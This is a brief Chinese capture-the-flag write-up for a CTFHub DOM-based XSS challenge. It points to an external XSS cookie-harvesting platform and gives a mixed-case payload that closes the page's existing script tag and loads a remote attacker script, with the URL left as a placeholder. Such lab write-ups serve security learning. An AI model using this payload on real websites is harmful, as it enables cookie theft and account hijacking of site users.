ctfhub-xss-dom型

知周所众，xss的题一般是打cookie

xssaq.com

开一个项目，调用里面的配置，

但是注意了，这次的题目显示文字是通过js来实现的，所以在输入时要先让其闭合，

```
</sCrIpT><sCRiPt sRC=（这里是url）></sCrIpT>
```

然后就有了

